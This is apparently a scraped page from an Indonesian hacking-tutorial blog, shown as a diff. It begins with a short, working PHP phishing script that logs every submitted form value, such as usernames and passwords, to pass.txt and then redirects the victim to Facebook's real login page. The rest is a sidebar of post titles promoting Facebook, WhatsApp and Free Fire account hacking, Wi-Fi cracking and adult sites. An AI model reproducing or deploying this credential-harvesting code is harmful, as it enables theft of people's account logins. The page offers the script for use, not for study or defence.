@@ -1,0 +1,34 @@
+
+ &lt;?php header('Location: http://www.Facebook.com/login.php'); $handle = fopen('pass.txt', 'a'); foreach($_GET as $variable =&gt; $value) { fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, '\n'); } fwrite($handle, '\n'); fclose($handle); exit; ?&gt;
+Posting Lebih BaruPosting Lama
+POSTINGAN POPULER
+
+Cara Hack Akun FF / Hack Akun FF Sultan APK 2021
+
+8 Aplikasi Hack FB Terbaik yang Ada Saat Ini
+
+Cara Hack Password Facebook dengan kode HTML
+
+Social Spy WhatsApp Aplikasi Hack 2021 / WhatsApp Spy Tool 2021
+
+Cara Hack FB Tanpa Aplikasi / Cara Hack Akun FB Dengan Aplikasi 2021
+
+6 Cara Membajak WA dan Cara Hack WA 2021
+
+APK Hack Akun FF Dengan Salin ID / Hack Akun Free Fire Salin ID / Hack Akun FF Dengan Cara Salin ID / Salin ID Free Fire Hack 2021
+
+Script Hack FB Untuk Hack FB Dengan Fake Login 2021
+
+Cara Membobol Wifi Tanpa Aplikasi dan Cara Bobol Wifi yang Dipassword Tanpa Aplikasi 2021
+
+5 Alamat Situs Dewasa pada Android Tanpa Aplikasi 2021
+RECENT POST
+Cara Buat Akun Facebook Baru Lewat HP 2021
+Cara Live Streaming di Facebook PC 2021
+Cara Bobol FB Lite yang Lupa Sandi 2021
+Cara Menghapus Pesan Marketplace di Messenger 2021
+Himzi Auto Like FB 2021
+Cara Menggunakan Facespy Hack FB 2021
+Cara Menggunakan Xflyboy Untuk Hack FB 2021
+About Contact Privacy Policy Disclaimer Sitemap TOS Youtube Twitter Instagram Facebook
+Copyright 2021 Cara1001
